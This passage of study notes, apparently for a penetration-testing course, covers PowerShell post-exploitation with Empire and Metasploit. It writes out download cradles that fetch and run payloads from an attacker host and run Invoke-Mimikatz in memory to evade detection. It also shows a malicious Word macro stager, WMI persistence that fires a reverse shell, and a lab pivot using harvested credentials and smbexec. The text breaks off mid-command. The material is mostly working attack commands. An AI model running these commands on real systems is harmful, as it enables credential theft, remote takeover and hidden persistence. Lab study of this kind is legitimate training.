+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.Webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/payload.ps1'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>once we execute the download cradle, we will receive the meterpreter session already</p>
+</blockquote>
+
+<p>in meterpreter session:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load powershell
+help = to show the options we have
+powershell_shell
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ProcessName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"iTunes"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>back to meterpreter:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell_execute</span><span class="w"> </span><span class="s1">'iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz'</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>it has the advantage that operates in the powershell memory, helping us to stay undetected.</p>
+</blockquote>
+
+<h3 id="sending-empire-session-to-metasploit">sending Empire session to Metasploit</h3>
+<p>in msfconsole:
+	exploit/multi/script/web_delivery
+	set srvhost = kali ip
+	set lhost = kali ip
+	set target 2 = PSH *powershell
+	run
+	copy the URL of the payload</p>
+
+<p>in Empire:
+	usemodule powershell/cpde_execution/invoke_metasploitpayload
+	info
+	set URL <paste the="" URL="" of="" metasploit="" payload="">
+	set Agent 65CY4XEG
+	execute
+	// Now it should open a session in metasploit</paste></p>
+
+<h2 id="empire-overview">Empire Overview</h2>
+
+<h3 id="install">Install</h3>
+<ul>
+  <li>https://github.com/EmpireProject/Empire</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">url</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">Empire</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">setup</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/install.sh</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="handlers">Handlers</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">listeners</span><span class="w">
+</span><span class="nx">help</span><span class="w">
+</span><span class="n">uselistener</span><span class="w">
+</span><span class="nx">userlistener</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">option</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">choice</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="config-to-use-ssl">config to use SSL</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">/root/tools/Empire/setup/</span><span class="w">
+</span><span class="o">.</span><span class="n">/cert.sh</span><span class="w">
+</span></code></pre></div></div>
+
+<p>in Empire:
+set CertPath /root/tools/Empire/data
+execute = run/exploit (metasploit)
+back = same as (metasploit)</p>
+
+<p>BindIP = lhost (metasploit)
+Port = lport (metasploit)</p>
+
+<ul>
+  <li>Verify
+listeners
+now our listener should appear</li>
+</ul>
+
+<h3 id="set-stager">set Stager</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">usestager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span><span class="n">usestager</span><span class="w"> </span><span class="nx">multi/launcher</span><span class="w">
+</span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">Listener</span><span class="w"> </span><span class="nx">http</span><span class="w">
+</span><span class="n">execute</span><span class="w">
+</span><span class="nx">copy</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">execute</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">machine</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="agents">Agents</h3>
+<p>After executing the payload in the target, we should have an agent in Empire = same as session in metasploit</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">agents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="nx">session</span><span class="w">
+</span><span class="n">help</span><span class="w">
+</span><span class="nx">interact</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">tab</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">choose</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">option</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">number</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">metasploit</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="in-empire-session">In Empire Session</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">help</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">available</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">sysinfo</span><span class="w"> </span><span class="p">(</span><span class="n">metasploit</span><span class="p">)</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">commands</span><span class="w">
+
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/GROUPS</span><span class="w">
+</span><span class="n">usemodule</span><span class="w">
+</span><span class="nx">searchmodule</span><span class="w"> </span><span class="nx">checks</span><span class="w">
+
+</span><span class="n">usemodule</span><span class="w"> </span><span class="nx">privesc/powerup/allchecks</span><span class="w">
+</span><span class="n">execute</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="client-side-attack">Client side attack</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">main</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">come</span><span class="w"> </span><span class="nx">back</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">main</span><span class="w"> </span><span class="nx">menu</span><span class="w">
+</span><span class="n">usestager</span><span class="w"> </span><span class="nx">windows/macro</span><span class="w">
+</span><span class="n">info</span><span class="w">
+</span><span class="nx">set</span><span class="w"> </span><span class="nx">Listener</span><span class="w"> </span><span class="nx">http</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">OutFile</span><span class="w"> </span><span class="nx">root/tools/Empire/data/macro</span><span class="w">
+</span><span class="n">execute</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>the macro code will be save in that directory
+we can copy-paste the macro to a word document
+make sure that you enable developer tab For your version of microsoft word
+alt+f11 = to open the visual basic 
+copy the payload to the editor
+save the file .doc</p>
+
+<blockquote>
+  <p>as the result of the macro execution in the target machine, we get a session in Empire</p>
+</blockquote>
+
+<h2 id="uac-bypass-powershell-exploit-script-walkthrough">UAC Bypass PowerShell Exploit Script Walkthrough</h2>
+
+<ul>
+  <li>Identify the program that which auto elevates to a high integrity process, which naturally bypass UAC in a sense.</li>
+  <li>Identify that the program checks For registry keys and values which are writable by us</li>
+  <li>and its responsable to associate file types of the msi extension to a specific application</li>
+  <li>we also hijack that process, to launch a command of our choosen, which was the calculator program.</li>
+</ul>
+
+<h3 id="introduction-to-leveraging-wmi-and-methods-for-persistence">Introduction to Leveraging WMI and Methods For Persistence</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w">
+</span><span class="nx">Get-Help</span><span class="w"> </span><span class="nx">Get-WmiObject</span><span class="w">
+</span><span class="n">Get-Help</span><span class="w"> </span><span class="nx">wmi</span><span class="w">
+
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="s2">"root/cimv2"</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="s2">"__Namespace"</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="s2">"root/cimv2"</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="s2">"__Namespace"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Namespace</span><span class="w"> </span><span class="s2">"root/cimv2"</span><span class="w"> </span><span class="nt">-List</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s2">"Win32_Service"</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">State</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s2">"Running"</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Service</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-Match</span><span class="w"> </span><span class="s2">"Defend"</span><span class="p">}</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="nt">-List</span><span class="w">
+</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-List</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="nt">-Membertyoe</span><span class="w"> </span><span class="nx">Method</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-List</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w">
+</span><span class="nv">$proc</span><span class="o">.</span><span class="nf">Create</span><span class="p">(</span><span class="s2">"cmd.exe"</span><span class="p">)</span><span class="w">
+
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>this should launch cmd.exe as a child process from WmiProvider</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WmiMethod</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p>// Also will generate a process as a child from the WmiProvider</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WmiMethod</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ProcessId</span><span class="w"> </span><span class="o">=</span><span class="s2">"2512"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="err">&lt;</span><span class="n">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Process</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ProcessId</span><span class="w"> </span><span class="o">=</span><span class="s2">"2512"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="err">&lt;</span><span class="n">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Remove-WmiObject</span><span class="w">
+</span></code></pre></div></div>
+
+<p>// if we want to kill the process remotely</p>
+
+<h3 id="powerlurk">PowerLurk</h3>
+<p>https://github.com/Sw4mpf0x/PowerLurk</p>
+
+<ul>
+  <li>make a payload in msfvenom</li>
+  <li>send to the target machine via python web server host</li>
+  <li>open a handler in metasploit</li>
+  <li>download the PowerLurk.ps1 from github</li>
+  <li>execute this command to grab the PowerLurk file and trigger with a program, in this case the calc.exe. 
+// Everytime the target execute the calculator our payload will be executed.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/PowerLurk.ps1'</span><span class="p">);</span><span class="w"> </span><span class="nx">Register-MaliciousWmiEvent</span><span class="w"> </span><span class="nt">-EventName</span><span class="w"> </span><span class="nx">CalcExec</span><span class="w"> </span><span class="nt">-PermanentCommand</span><span class="w"> </span><span class="s2">"cmd.exe /c C:\programdata\payload.exe"</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="nx">ProcessStart</span><span class="w"> </span><span class="nt">-ProcessName</span><span class="w"> </span><span class="nx">calc.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>To view our malicious WMI Event</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/PowerLurk.ps1'</span><span class="p">);</span><span class="w"> </span><span class="nx">Get-WmiEvent</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">CalcExec</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>now its up to the target user, to open the calculator 
+it will trigger the reverse shell back to our kali</p>
+</blockquote>
+
+<h3 id="if-you-wanna-remove-the-malicious-wmi-event">if you wanna Remove the Malicious WMI Event</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/PowerLurk,ps1'</span><span class="p">);</span><span class="w"> </span><span class="nx">Get-WmiEvent</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">CalcExec</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Remove-WmiObject</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="lab-1---leveraging-powershell-during-exploitation">Lab 1 - Leveraging PowerShell During Exploitation</h2>
+
+<p>organization - 172.16.80.0/24
+172.16.80.1
+172.16.80.100
+tester ip = 175.12.80.0/24</p>
+
+<p>#
+my ip 175.12.80.10
+#
+172.16.80.1
+172.16.80.100
+	135
+	139
+	445
+	4983</p>
+
+<blockquote>
+  <p>we can access in browser or by nc</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="mf">172.16</span><span class="o">.</span><span class="nf">80</span><span class="o">.</span><span class="nf">100</span><span class="p">:</span><span class="mi">4983</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="nx">nc</span><span class="w"> </span><span class="nx">172.16.80.100</span><span class="w"> </span><span class="nx">4983</span><span class="w">
+</span><span class="err">@</span><span class="n">echo</span><span class="w"> </span><span class="nx">off</span><span class="w">  </span><span class="nx">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="s2">"\\10.100.11.150\C$"</span><span class="w"> </span><span class="nx">/user:local_admin</span><span class="w"> </span><span class="nx">P</span><span class="err">@</span><span class="nx">ssw0rd123</span><span class="w">  </span><span class="nx">if</span><span class="w"> </span><span class="nx">exist</span><span class="w"> </span><span class="s2">"\\10.100.11.150\C</span><span class="err">$</span><span class="s2">\Program_Files\MSBuild\ErrorLog.txt"</span><span class="w"> </span><span class="p">(</span><span class="w">      </span><span class="n">echo</span><span class="w"> </span><span class="s2">"Copying errors..."</span><span class="w">      </span><span class="nx">copy</span><span class="w"> </span><span class="s2">"\\10.100.11.150\C</span><span class="err">$</span><span class="s2">\Program_Files\MSBuild\ErrorLog.txt"</span><span class="w"> </span><span class="nx">C:\Users\local_admin\Logs\Host1\</span><span class="w">      </span><span class="nx">del</span><span class="w"> </span><span class="s2">"\\10.100.11.150\C</span><span class="err">$</span><span class="s2">\Program_Files\MSBuild\ErrorLog.txt"</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="nx">else</span><span class="w"> </span><span class="p">(</span><span class="w">      </span><span class="n">echo</span><span class="w"> </span><span class="s2">"No errors!"</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="nx">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="s2">"\\10.100.11.150\C$"</span><span class="w"> </span><span class="nx">/delete</span><span class="w">
+
+</span></code></pre></div></div>
+
+<ul>
+  <li>we discovered a new ip and credentials</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.100.11.150
+local_admin:P@ssw0rd123
+</code></pre></div></div>
+
+<blockquote>
+  <p>now that we have credentials, lets smbexec into it</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">john</span><span class="err">㉿</span><span class="nx">kali</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">/opt/impacket/examples</span><span class="p">]</span><span class="w">
+</span><span class="err">└─$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">smbexec.py</span><span class="w"> </span><span class="s1">'local_admin:P@ssw0rd123'</span><span class="err">@</span><span class="mf">172.16</span><span class="o">.</span><span class="nf">80</span><span class="o">.</span><span class="nf">100</span><span class="w"> 
+
+	</span><span class="n">ipconfig</span><span class="w">
+	</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="n">userdomain</span><span class="o">%</span><span class="w">
+
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://10.100.11.101:8000/payload2.exe'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Windows\Temp\payload.exe'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>after some time configuring Empire</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span><span class="w"> </span><span class="nx">powershell-empire</span><span class="w"> </span><span class="nx">server</span><span class="w">
+</span><span class="n">sudo</span><span class="w"> </span><span class="nx">powershell-empire</span><span class="w"> </span><span class="nx">client</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="in-empire">in Empire:</h3>
+<p>listeners
+uselistener http
+info
+set Host <kali ip="">
+execute
+main</kali></p>
+
+<p>usestager multi/launcher
+set listener http
+execute</p>
+
+<p>copy the payload and execute into the first shell from smbexec
+// we should get a shell back from Empire = they call this agent</p>
+
+<p>agents
+interact <agent number="">
+// its the same as session -i <number> from Metasploit</number></agent></p>
+
+<p>usemodule situation_awareness/network/arpscan
+set CIDR 10.100.11.0/24
+set Agent <agent number="">
+execute</agent></p>
+
+<ul>
+  <li>we discovered 2 hosts: 100 e 101</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="n">MAC</span><span class="w">               </span><span class="nx">Address</span><span class="w">      
+</span><span class="o">---</span><span class="w">               </span><span class="o">-------</span><span class="w">      
+</span><span class="mi">00</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="n">A0:4F:BC</span><span class="w"> </span><span class="nx">10.100.11.1</span><span class="w">  
+</span><span class="mi">00</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="n">A0:13:FF</span><span class="w"> </span><span class="nx">10.100.11.100</span><span class="w">
+</span><span class="mi">00</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="n">A0:53:98</span><span class="w"> </span><span class="nx">10.100.11.101</span><span class="w">
+</span><span class="mi">00</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="n">A0:53:98</span><span class="w"> </span><span class="nx">10.100.11.255</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="now-lets-search-for-open-ports">now lets search for open ports</h3>
+<p>usemodule powershell/situational_awareness/network/portscan
+set Hosts 10.100.11.100 = ip of the target found
+set Agent <agent number="">
+execute</agent></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Hostname</span><span class="w">      </span><span class="nx">OpenPorts</span><span class="w">       
+</span><span class="o">--------</span><span class="w">      </span><span class="o">---------</span><span class="w">       
+</span><span class="mf">10.100</span><span class="o">.</span><span class="nf">11</span><span class="o">.</span><span class="nf">100</span><span class="w"> </span><span class="mi">445</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">8443</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="passing-the-session-to-metasploit-because-we-will-need-to-do-some-pivot">Passing the session to Metasploit, because we will need to do some Pivot</h3>
+<p>In Metasploit:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="w"> </span><span class="nx">exploit/multi/script/web_delivery</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">target</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">powershell</span><span class="w">
+</span><span class="nx">set</span><span class="w"> </span><span class="nx">SRVHOST</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">lhost</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span><span class="n">copy</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">URL</span><span class="w">
+</span></code></pre></div></div>
+
+<p>in Empire:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">usemodule</span><span class="w"> </span><span class="nx">code_execution/invoke_metasploitpayload</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">URL</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">the</span><span class="w"> </span><span class="nx">URL</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">metasploit</span><span class="w"> </span><span class="nx">module</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">agent</span><span class="w"> </span><span class="nx">number</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">execute</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>here, we should get a meterpreter session</p>
+</blockquote>
+
+<p>in Metasploit:
+we are dealing with different networks, so we will need to set an autoroute</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="w"> </span><span class="nx">post/multi/manage/autoroute</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span><span class="n">run</span><span class="w">
+
+</span><span class="n">use</span><span class="w"> </span><span class="nx">auxiliary/server/socks_proxy</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">srvhost</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">run</span><span class="w">
+</span></code></pre></div></div>
+
+<p>remember the port must be the same as proxychains.conf file
+now we can set our browser, in the proxy config, in the socks session, set the kali ip with the right port
+we can open the page 10.100.11.100:8443 from that weird port that was open
+a apache tomcat 7.0.81 page opens, if we search For vulnerability For that version of apache</p>
+
+<ul>
+  <li>
+    <p>we get CVE-2017-12617
+ metasploit has this exploit, but first we need to set a proxy</p>
+  </li>
+  <li>
+    <p>why do we need to set a proxy?
+  because its a internal network, we got set the proxy, For the target of the internal network can receive our payload</p>
+  </li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="w"> </span><span class="nx">post/windows/manage/portproxy</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">CONNECT_ADDRESS</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">CONNECT_PORT</span><span class="w"> </span><span class="nx">4444</span><span class="w">
